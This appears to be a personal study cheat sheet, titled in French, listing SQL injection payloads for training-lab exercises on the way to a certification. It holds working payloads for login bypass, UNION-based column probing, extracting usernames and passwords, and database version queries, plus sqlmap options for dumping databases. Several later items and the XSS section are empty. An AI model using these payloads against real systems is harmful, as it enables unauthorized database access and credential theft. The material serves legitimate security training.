# Liste des commandes SQLi, XSS, CRCF ect.... pour passer la certification


## 1/ SQL injection

- [X] SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    `?category=Pets' OR 1=1 --`

- [X] SQL injection vulnerability allowing login bypass
    
    `csrf=ok13OxKIWATN6nuJiviRmIaPQBeSNtTB&username=administrator'--&password=test`
    

- [X] SQL injection UNION attack, determining the number of columns returned by the query

    `?category=Pets'+UNION+SELECT+NULL,NULL,NULL--`

- [X] SQL injection UNION attack, finding a column containing text

    `?category=Pets'+UNION+SELECT+NULL,'3QFtaD',NULL--`

- [X] SQL injection UNION attack, retrieving data from other tables

    `?category=Gifts'+UNION+SELECT+username,password+from+users--`

- [X] SQL injection UNION attack, retrieving multiple values in a single column

    `?category=Pets'+UNION+SELECT+NULL,CONCAT(username,'+',password)+FROM+users--`
   
- [X] SQL injection attack, querying the database type and version on Oracle

    `?category=Pets'+UNION+SELECT+'a',banner+FROM+v$version--`

- [X] SQL injection attack, querying the database type and version on MySQL and Microsoft

    `?category=Gifts'+UNION+SELECT+@@version,+'a'#` # pour les commentaires en MySQL

- [X] SQL injection attack, listing the database contents on non-Oracle databases

    ```sqlmap -u URL
    
    --all #Retrieve everything
    
    --dump #Dump DBMS database table entries
    
    --dbs #Names of the available databases
    
    --tables #Tables of a database ( -D <DB NAME> )
    
    --columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
    
    -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column```
    
    
- [ ] SQL injection attack, listing the database contents on Oracle

- [ ] Blind SQL injection with conditional responses

- [ ] Blind SQL injection with conditional errors

- [ ] Visible error-based SQL injection

- [ ] Blind SQL injection with time delays

- [ ] Blind SQL injection with time delays and information retrieval

- [ ] Blind SQL injection with out-of-band interaction

- [ ] Blind SQL injection with out-of-band data exfiltration

- [ ] SQL injection with filter bypass via XML encoding






## 2/ XSS
